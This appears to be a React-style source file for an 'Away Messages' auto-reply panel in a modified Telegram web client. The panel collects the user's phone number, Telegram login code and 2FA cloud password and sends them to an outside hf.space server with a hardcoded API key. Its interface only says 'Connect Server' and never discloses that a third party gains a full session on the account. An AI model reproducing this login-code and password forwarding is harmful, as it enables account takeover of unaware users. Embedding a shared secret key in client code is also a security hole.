import type { FC } from '../../../lib/teact/teact';
import { memo, useState, useCallback, useEffect } from '../../../lib/teact/teact';
import { withGlobal } from '../../../global';

import Button from '../../ui/Button';
import InputText from '../../ui/InputText';
import './Settings.scss';

const BACKEND_URL = "https://kmt285476-telegram.hf.space"; 
const API_KEY = "tg_custom_secret_key_2026";

type OwnProps = { onReset: () => void; };
type StateProps = { 
  currentUserId?: string;
  currentUserPhone?: string; 
};

const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUserPhone }) => {
  const safeUserId = currentUserId || "unknown";

  const [isFetching, setIsFetching] = useState(true);
  const [isLinked, setIsLinked] = useState(false);
  const [isEnabled, setIsEnabled] = useState(false);
  const [replyText, setReplyText] = useState("I am currently unavailable. I will reply to you later.");
  
  const [step, setStep] = useState<'idle' | 'otp' | '2fa'>(() => {
    return (localStorage.getItem(`ar_setup_step_${safeUserId}`) as any) || 'idle';
  });
  const [savedPhone, setSavedPhone] = useState(() => localStorage.getItem(`ar_setup_phone_${safeUserId}`) || '');
  
  const [otpCode, setOtpCode] = useState('');
  const [twoFaPassword, setTwoFaPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  useEffect(() => {
    if (safeUserId === "unknown") return;
    const fetchSettings = async () => {
      try {
        const res = await fetch(`${BACKEND_URL}/api/get_auto_reply`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
          body: JSON.stringify({ user_id: safeUserId })
        });
        const data = await res.json();
        if (res.ok && data.is_linked) {
          setIsLinked(true);
          setIsEnabled(data.enabled);
          if (data.text) setReplyText(data.text);
        } else {
          setIsLinked(false);
        }
      } catch (err) {
      } finally {
        setIsFetching(false);
      }
    };
    fetchSettings();
  }, [safeUserId]);

  const handleCancelSetup = useCallback(() => {
    setStep('idle');
    setOtpCode('');
    setTwoFaPassword('');
    setErrorMsg('');
    localStorage.removeItem(`ar_setup_step_${safeUserId}`);
    localStorage.removeItem(`ar_setup_phone_${safeUserId}`);
  }, [safeUserId]);

  const handleAutoRequestCode = async () => {
    if (!currentUserPhone) {
        setErrorMsg("Phone number not found.");
        return;
    }
    setErrorMsg('');
    const formattedPhone = currentUserPhone.startsWith('+') ? currentUserPhone : `+${currentUserPhone}`;
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/request_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ phone_number: formattedPhone })
      });
      if (res.ok) {
        setStep('otp');
        setSavedPhone(formattedPhone);
        localStorage.setItem(`ar_setup_step_${safeUserId}`, 'otp');
        localStorage.setItem(`ar_setup_phone_${safeUserId}`, formattedPhone);
      } else {
        const data = await res.json();
        setErrorMsg(data.error || "Failed to request code.");
      }
    } catch (err) { setErrorMsg("Network Error."); }
    setIsLoading(false);
  };

  const handleVerifyCode = async () => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, phone_number: savedPhone, otp_code: otpCode, two_step_password: twoFaPassword || undefined })
      });
      const data = await res.json();
      if (res.ok) {
        handleCancelSetup(); 
        setIsLinked(true);
        setIsEnabled(true);
      } else if (res.status === 401 && data.error === "2FA_REQUIRED") {
        setStep('2fa');
      } else {
        setErrorMsg(data.error || "Verification failed.");
      }
    } catch (err) { setErrorMsg("Network Error."); }
    setIsLoading(false);
  };

  const handleSaveSettings = async () => {
    setIsLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/update_auto_reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
        body: JSON.stringify({ user_id: safeUserId, enabled: isEnabled, text: replyText })
      });
      if (!res.ok) {
        setIsLinked(false);
        setStep('idle');
        setErrorMsg("Session expired. Please reconnect.");
      }
    } catch (err) { setErrorMsg("Failed to save."); }
    setIsLoading(false);
  };

  if (isFetching) return null;

  // 🌟 [၁] Login/Connect Step UI (No Icons)
  if (!isLinked) {
    return (
      <div className="settings-content custom-scroll">
        <div className="settings-header">
          <h3 className="settings-header-title">Away Messages</h3>
        </div>
        <div className="settings-main-menu" style={{ padding: '2.5rem 1.5rem', textAlign: 'center' }}>
            {errorMsg && <p style={{ color: 'var(--color-error)', fontSize: '14px', marginBottom: '1.5rem' }}>{errorMsg}</p>}
            
            <div style={{ width: '100%', maxWidth: '320px', margin: '0 auto' }}>
                <h4 style={{ fontSize: '20px', fontWeight: 500, marginBottom: '8px' }}>
                    {step === 'idle' ? "Connect Server" : step === 'otp' ? "Enter Code" : "2FA Password"}
                </h4>
                <p style={{ color: 'var(--color-text-secondary)', marginBottom: '2rem', fontSize: '15px' }}>
                    {step === 'idle' ? "Enable auto-reply for your private messages." : "Please verify your account to continue."}
                </p>

                {step === 'otp' && <div style={{ textAlign: 'left', marginBottom: '20px' }}><InputText label="OTP Code" value={otpCode} onChange={(e: any) => setOtpCode(e.target.value)} /></div>}
                {step === '2fa' && <div style={{ textAlign: 'left', marginBottom: '20px' }}><InputText label="Cloud Password" type="password" value={twoFaPassword} onChange={(e: any) => setTwoFaPassword(e.target.value)} /></div>}

                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                    <Button onClick={step === 'idle' ? handleAutoRequestCode : handleVerifyCode} isLoading={isLoading} fluid>
                        {step === 'idle' ? "REQUEST CODE" : "CONTINUE"}
                    </Button>
                    {step !== 'idle' && <Button color="danger" className="translucent" onClick={handleCancelSetup} disabled={isLoading} fluid>CANCEL</Button>}
                </div>
            </div>
        </div>
      </div>
    );
  }

  // 🌟 [၂] Main Settings UI (Professional & Responsive)
  return (
    <div className="settings-content custom-scroll">
      <div className="settings-header">
        <h3 className="settings-header-title">Away Messages</h3>
      </div>
      
      <div className="settings-main-menu" style={{ padding: '1rem' }}>
        
        {/* Professional Native Switch Wrapper */}
        <div 
          onClick={() => setIsEnabled(!isEnabled)}
          style={{ 
            display: 'flex', alignItems: 'center', justifyContent: 'space-between', 
            padding: '16px', background: 'var(--color-background)', 
            borderRadius: '12px', cursor: 'pointer', marginBottom: '20px',
            border: '1px solid var(--color-borders)'
          }}
        >
          <div style={{ display: 'flex', flexDirection: 'column' }}>
            <span style={{ fontSize: '16px', fontWeight: 500 }}>Enable Auto-Reply</span>
            <span style={{ fontSize: '13px', color: 'var(--color-text-secondary)', marginTop: '2px' }}>Reply automatically to private chats.</span>
          </div>
          <div style={{ 
            width: '44px', height: '24px', borderRadius: '12px', 
            background: isEnabled ? 'var(--color-primary)' : '#ccc',
            position: 'relative', transition: '0.3s'
          }}>
            <div style={{ 
              width: '20px', height: '20px', borderRadius: '50%', background: '#fff',
              position: 'absolute', top: '2px', left: isEnabled ? '22px' : '2px',
              transition: '0.3s', boxShadow: '0 1px 3px rgba(0,0,0,0.2)'
            }} />
          </div>
        </div>

        {/* Responsive Textarea Box */}
        <div style={{ opacity: isEnabled ? 1 : 0.5, pointerEvents: isEnabled ? 'auto' : 'none', transition: '0.3s' }}>
          <h4 style={{ fontSize: '13px', fontWeight: 600, color: 'var(--color-primary)', marginLeft: '4px', marginBottom: '8px', textTransform: 'uppercase' }}>
            Message Content
          </h4>
          <textarea
            value={replyText}
            onChange={(e: any) => setReplyText(e.target.value)}
            placeholder="Type your away message here..."
            style={{
              width: '100%', minHeight: '120px', padding: '14px', fontSize: '15px', 
              borderRadius: '12px', border: '1px solid var(--color-borders)',
              background: 'var(--color-background)', color: 'var(--color-text)',
              outline: 'none', resize: 'vertical', lineHeight: '1.5', fontFamily: 'inherit'
            }}
          />
          <p style={{ fontSize: '12px', color: 'var(--color-text-secondary)', marginTop: '8px', paddingLeft: '4px' }}>
            You can write a long message. Drag the corner to resize the box.
          </p>
        </div>

        <div style={{ marginTop: '24px' }}>
            {errorMsg && <p style={{ color: 'var(--color-error)', textAlign: 'center', marginBottom: '12px' }}>{errorMsg}</p>}
            <Button onClick={handleSaveSettings} isLoading={isLoading} fluid>SAVE SETTINGS</Button>
        </div>

      </div>
    </div>
  );
};

export default memo(withGlobal<OwnProps>((global): StateProps => { 
    const { currentUserId, users } = global;
    return { 
        currentUserId, 
        currentUserPhone: (currentUserId && users?.byId?.[currentUserId]?.phoneNumber) || undefined 
    }; 
})(AutoReplySettings));
